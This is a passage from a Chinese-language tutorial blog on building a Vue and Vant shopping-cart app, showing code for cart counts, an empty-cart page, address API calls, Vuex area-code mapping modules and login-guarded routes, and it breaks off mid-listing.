添加到数组中</span></span><br><span class="line">    }</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">imgSrcArray</span> = srcArray</span><br><span class="line">    <span class="comment">// console.log(this.imgSrcArray) // 输出结果数组</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异步获取购物车列表</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">getCartAction</span></span><br><span class="line">    <span class="comment">// 获取购物车商品总数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cartTotal</span> = <span class="variable language_">this</span>.<span class="property">countCartTotal</span></span><br><span class="line">    <span class="comment">// console.log(this.cartTotal)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 说明有token，可以直接加入购物车</span></span><br><span class="line">      <span class="keyword">const</span> obj = { <span class="comment">// 此为添加到购物车的点击事件</span></span><br><span class="line">        <span class="attr">goodsId</span>: <span class="variable language_">this</span>.<span class="property">detailId</span>,</span><br><span class="line">        <span class="attr">goodsNum</span>: <span class="variable language_">this</span>.<span class="property">addCount</span>,</span><br><span class="line">        <span class="attr">goodsSkuId</span>: <span class="variable language_">this</span>.<span class="property">goodsSkuId</span></span><br><span class="line">      }</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">'Cart/addCartAction'</span>, obj)</span><br><span class="line">      <span class="comment">// 获取购物车商品总数</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cartTotal</span> = <span class="variable language_">this</span>.<span class="property">countCartTotal</span></span><br><span class="line">      <span class="variable language_">this</span>.$toast(<span class="string">'加入购物车成功！'</span>)</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">showPannel</span> = <span class="literal">false</span> <span class="comment">// 关闭弹层</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">watch</span>: {</span><br><span class="line">    <span class="comment">// 监听 countCartTotal 的变化，自动更新 cartTotal</span></span><br><span class="line">    <span class="title function_">countCartTotal</span> (newVal) {</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cartTotal</span> = newVal</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="空购物车处理"><a class="markdownIt-Anchor" href="#空购物车处理"></a> 空购物车处理</h3><p>将除标题以外的盒子用大盒子包裹起来：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="cart"&gt;</span><br><span class="line">    &lt;van-nav-bar title="购物车" fixed /&gt;</span><br><span class="line">    &lt;!-- 判断登录，且购物车列表不为空才渲染 --&gt;</span><br><span class="line">    &lt;div v-if="isLogin &amp;&amp; cartList.length &gt; 0"&gt;...&lt;/div&gt;</span><br><span class="line">    &lt;!-- 未登录或购物车列表为空时渲染提示页面 --&gt;</span><br><span class="line">    &lt;van-empty v-else description="空空如也，快去逛逛吧~"&gt;</span><br><span class="line">      &lt;van-button</span><br><span class="line">        round</span><br><span class="line">        type="danger"</span><br><span class="line">        class="bottom-button"</span><br><span class="line">        @click="$router.push('/home')"</span><br><span class="line">        &gt;去逛逛&lt;/van-button</span><br><span class="line">      &gt;</span><br><span class="line">    &lt;/van-empty&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><p>并提供计算属性</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">isLogin</span> () {</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>.<span class="property">token</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>并引入对应 Empty 组件的 css 样式</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bottom-button</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">160px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="地址管理"><a class="markdownIt-Anchor" href="#地址管理"></a> 地址管理</h2><blockquote><p>地址选择里面涉及到一个地区选择器，可以自行定义数据也可以使用官方的数据。可以参考：Vant 使用 <a href="https://blog.csdn.net/qq_51055690/article/details/126281265">Vant Area Data</a></p></blockquote><h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3><p>封装 api 接口：<code>api/address.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取地址列表</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getAddressList</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/address/list"</span>);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取某个地址的详情</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getAddressDetail</span> = (<span class="params">addressId</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/address/detail"</span>, {</span><br><span class="line">    <span class="attr">params</span>: {</span><br><span class="line">      <span class="attr">addressId</span>: addressId,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加收货地址</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">addAddress</span> = (<span class="params">dataObj</span>) =&gt; {</span><br><span class="line">  <span class="comment">// console.log('api_dataObj', dataObj)</span></span><br><span class="line">  <span class="comment">// 直接使用dataObj中的数据</span></span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/address/add"</span>, {</span><br><span class="line">    <span class="attr">form</span>: {</span><br><span class="line">      <span class="attr">name</span>: dataObj.<span class="property">name</span>,</span><br><span class="line">      <span class="attr">phone</span>: dataObj.<span class="property">phone</span>,</span><br><span class="line">      <span class="attr">region</span>: dataObj.<span class="property">region</span>,</span><br><span class="line">      <span class="attr">detail</span>: dataObj.<span class="property">detail</span>,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新收货地址</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">updateAddress</span> = (<span class="params">dataObj</span>) =&gt; {</span><br><span class="line">  <span class="comment">// 直接使用dataObj中的数据</span></span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/address/edit"</span>, {</span><br><span class="line">    <span class="attr">addressId</span>: dataObj.<span class="property">address_id</span>,</span><br><span class="line">    <span class="attr">form</span>: dataObj.<span class="property">form</span>,</span><br><span class="line">  });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置默认地址</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">setDefaultAddress</span> = (<span class="params">addressId</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/address/setDefault"</span>, { addressId });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除收货地址</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">deleteAddress</span> = (<span class="params">addressId</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">post</span>(<span class="string">"/address/remove"</span>, { addressId });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>Vuex 子模块：<code>store/modules/address.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> {</span><br><span class="line">  getAddressList,</span><br><span class="line">  updateAddress,</span><br><span class="line">  deleteAddress,</span><br><span class="line">  getAddressDetail,</span><br><span class="line">  addAddress,</span><br><span class="line">  setDefaultAddress,</span><br><span class="line">} <span class="keyword">from</span> <span class="string">"@/api/address"</span>;</span><br><span class="line"><span class="comment">// import {Toast} from 'vant'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="title class_">AddressList</span>: [],</span><br><span class="line">      <span class="comment">// 初始化时从 localStorage 中获取默认地址 ID</span></span><br><span class="line">      <span class="attr">defaultAddressId</span>: <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">"defaultAddressId"</span>) || <span class="string">""</span>,</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">mutations</span>: {</span><br><span class="line">    <span class="comment">// 编辑地址</span></span><br><span class="line">    <span class="title function_">editAddress</span>(<span class="params">state, newAddress</span>) {</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">AddressList</span> = newAddress;</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 更新默认地址的 ID 并保存到 localStorage</span></span><br><span class="line">    <span class="title function_">setDefaultAddressId</span>(<span class="params">state, addressId</span>) {</span><br><span class="line">      state.<span class="property">defaultAddressId</span> = addressId;</span><br><span class="line">      <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">"defaultAddressId"</span>, addressId); <span class="comment">// 保存到 localStorage</span></span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">actions</span>: {</span><br><span class="line">    <span class="comment">// 获取地址列表</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getAddressList</span>(<span class="params"></span>) {</span><br><span class="line">      <span class="keyword">const</span> { data } = <span class="keyword">await</span> <span class="title function_">getAddressList</span>();</span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取某个地址的详情</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getAddressDetail</span>(<span class="params">context, addressId</span>) {</span><br><span class="line">      <span class="keyword">if</span> (!addressId) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">"Address ID is required"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="comment">// console.log('getAddressDetail被调用，addressId：', addressId)</span></span><br><span class="line">      <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">getAddressDetail</span>(addressId);</span><br><span class="line">      <span class="comment">// console.log('getAddressDetail返回的数据：', data)</span></span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加地址</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">addAddress</span>(<span class="params">context, dataObj</span>) {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"vuex_dataObj:"</span>, dataObj);</span><br><span class="line">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">addAddress</span>(dataObj);</span><br><span class="line">      <span class="keyword">if</span> (res.<span class="property">status</span> === <span class="number">200</span>) {</span><br><span class="line">        <span class="comment">// 成功后，重新通过上面的actions方法拉取地址列表</span></span><br><span class="line">        context.<span class="title function_">dispatch</span>(<span class="string">"getAddressList"</span>);</span><br><span class="line">      }</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认地址(无用的接口，设置后拉取列表，其中不包含默认地址是否设置的状态)</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">setDefaultAddress</span>(<span class="params">context, addressId</span>) {</span><br><span class="line">      <span class="comment">// 发送请求</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">setDefaultAddress</span>(addressId);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 成功后，重新拉取地址列表</span></span><br><span class="line">      <span class="title function_">getAddressList</span>();</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新地址</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">updateAddress</span>(<span class="params">context, dataObj</span>) {</span><br><span class="line">      <span class="comment">// 发送更新请求</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">updateAddress</span>(dataObj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 更新之后，重新拉取地址列表</span></span><br><span class="line">      <span class="title function_">getAddressList</span>();</span><br><span class="line">    },</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除地址</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">deleteAddress</span>(<span class="params">context, addressId</span>) {</span><br><span class="line">      <span class="comment">// 发送删除请求</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">deleteAddress</span>(addressId);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 删除成功后，重新拉取地址列表</span></span><br><span class="line">      <span class="title function_">getAddressList</span>();</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">getters</span>: {</span><br><span class="line">    <span class="comment">// 获取默认地址 ID（优先从 Vuex 中获取，否则从 localStorage 中获取）</span></span><br><span class="line">    <span class="attr">getDefaultAddressId</span>: <span class="function">(<span class="params">state</span>) =&gt;</span></span><br><span class="line">      state.<span class="property">defaultAddressId</span> || <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">"defaultAddressId"</span>),</span><br><span class="line">  },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>Vuex 子模块 addressMap 处理引入的 vant 官方地区数据：<code>store/modules/addressMap.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { areaList } <span class="keyword">from</span> <span class="string">"@vant/area-data"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = {</span><br><span class="line">  <span class="comment">// 代码到名称的映射</span></span><br><span class="line">  <span class="attr">codeToNameMap</span>: {</span><br><span class="line">    <span class="attr">provinceMap</span>: {},</span><br><span class="line">    <span class="attr">cityMap</span>: {},</span><br><span class="line">    <span class="attr">countyMap</span>: {},</span><br><span class="line">  },</span><br><span class="line">  <span class="comment">// 名称到代码的映射</span></span><br><span class="line">  <span class="attr">nameToCodeMap</span>: {</span><br><span class="line">    <span class="attr">provinceMap</span>: {},</span><br><span class="line">    <span class="attr">cityMap</span>: {},</span><br><span class="line">    <span class="attr">countyMap</span>: {},</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = {</span><br><span class="line">  <span class="comment">// 根据名称获取代码</span></span><br><span class="line">  <span class="attr">nameToCode</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> <span class="function">(<span class="params">name</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      state.<span class="property">nameToCodeMap</span>.<span class="property">provinceMap</span>[name] ||</span><br><span class="line">      state.<span class="property">nameToCodeMap</span>.<span class="property">cityMap</span>[name] ||</span><br><span class="line">      state.<span class="property">nameToCodeMap</span>.<span class="property">countyMap</span>[name] ||</span><br><span class="line">      <span class="literal">null</span></span><br><span class="line">    );</span><br><span class="line">  },</span><br><span class="line">  <span class="comment">// 根据代码获取名称</span></span><br><span class="line">  <span class="attr">codeToName</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> <span class="function">(<span class="params">code</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      state.<span class="property">codeToNameMap</span>.<span class="property">provinceMap</span>[code] ||</span><br><span class="line">      state.<span class="property">codeToNameMap</span>.<span class="property">cityMap</span>[code] ||</span><br><span class="line">      state.<span class="property">codeToNameMap</span>.<span class="property">countyMap</span>[code] ||</span><br><span class="line">      <span class="literal">null</span></span><br><span class="line">    );</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = {</span><br><span class="line">  <span class="title function_">SET_CODE_TO_NAME_MAP</span>(<span class="params">state, { map, type }</span>) {</span><br><span class="line">    state.<span class="property">codeToNameMap</span>[type] = map;</span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">SET_NAME_TO_CODE_MAP</span>(<span class="params">state, { map, type }</span>) {</span><br><span class="line">    state.<span class="property">nameToCodeMap</span>[type] = map;</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = {</span><br><span class="line">  <span class="comment">// 构建映射表</span></span><br><span class="line">  <span class="title function_">buildReverseMaps</span>(<span class="params">{ commit }</span>) {</span><br><span class="line">    <span class="keyword">const</span> provinceCodeToNameMap = <span class="title function_">buildCodeToNameMap</span>(areaList.<span class="property">province_list</span>);</span><br><span class="line">    <span class="keyword">const</span> cityCodeToNameMap = <span class="title function_">buildCodeToNameMap</span>(areaList.<span class="property">city_list</span>);</span><br><span class="line">    <span class="keyword">const</span> countyCodeToNameMap = <span class="title function_">buildCodeToNameMap</span>(areaList.<span class="property">county_list</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> provinceNameToCodeMap = <span class="title function_">buildNameToCodeMap</span>(areaList.<span class="property">province_list</span>);</span><br><span class="line">    <span class="keyword">const</span> cityNameToCodeMap = <span class="title function_">buildNameToCodeMap</span>(areaList.<span class="property">city_list</span>);</span><br><span class="line">    <span class="keyword">const</span> countyNameToCodeMap = <span class="title function_">buildNameToCodeMap</span>(areaList.<span class="property">county_list</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_CODE_TO_NAME_MAP"</span>, {</span><br><span class="line">      <span class="attr">map</span>: provinceCodeToNameMap,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">"provinceMap"</span>,</span><br><span class="line">    });</span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_CODE_TO_NAME_MAP"</span>, { <span class="attr">map</span>: cityCodeToNameMap, <span class="attr">type</span>: <span class="string">"cityMap"</span> });</span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_CODE_TO_NAME_MAP"</span>, {</span><br><span class="line">      <span class="attr">map</span>: countyCodeToNameMap,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">"countyMap"</span>,</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_NAME_TO_CODE_MAP"</span>, {</span><br><span class="line">      <span class="attr">map</span>: provinceNameToCodeMap,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">"provinceMap"</span>,</span><br><span class="line">    });</span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_NAME_TO_CODE_MAP"</span>, { <span class="attr">map</span>: cityNameToCodeMap, <span class="attr">type</span>: <span class="string">"cityMap"</span> });</span><br><span class="line">    <span class="title function_">commit</span>(<span class="string">"SET_NAME_TO_CODE_MAP"</span>, {</span><br><span class="line">      <span class="attr">map</span>: countyNameToCodeMap,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">"countyMap"</span>,</span><br><span class="line">    });</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建代码到名称的映射</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildCodeToNameMap</span>(<span class="params">list</span>) {</span><br><span class="line">  <span class="keyword">const</span> map = {};</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">keys</span>(list).<span class="title function_">forEach</span>(<span class="function">(<span class="params">code</span>) =&gt;</span> {</span><br><span class="line">    map[code] = list[code]; <span class="comment">// 代码作为键，名称作为值</span></span><br><span class="line">  });</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建名称到代码的映射</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildNameToCodeMap</span>(<span class="params">list</span>) {</span><br><span class="line">  <span class="keyword">const</span> map = {};</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">keys</span>(list).<span class="title function_">forEach</span>(<span class="function">(<span class="params">code</span>) =&gt;</span> {</span><br><span class="line">    map[list[code]] = code; <span class="comment">// 名称作为键，代码作为值</span></span><br><span class="line">  });</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  getters,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>配置路由并新增守卫规则：<code>router/index.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Address</span> <span class="keyword">from</span> <span class="string">'@/views/address/index.vue'</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AddressEdit</span> <span class="keyword">from</span> <span class="string">'@/views/address/edit.vue'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  { <span class="attr">path</span>: <span class="string">'/address/manage'</span>, <span class="attr">component</span>: <span class="title class_">Address</span> },</span><br><span class="line">  { <span class="attr">path</span>: <span class="string">'/address/edit'</span>, <span class="attr">component</span>: <span class="title class_">AddressEdit</span> },</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组存储需要登录才能访问的路由</span></span><br><span class="line"><span class="keyword">const</span> authNeedRouters = [<span class="string">'/myorder'</span>, <span class="string">'/pay'</span>, <span class="string">'/address'</span>, <span class="string">'/address/edit'</span>, <span class="string">'/address/manage'</span>]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="地址列表"><a class="markdownIt-Anchor" href="#地址列表"></a> 地址列表</h3><p>地址列表代码：<code>views/address/index.vue</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 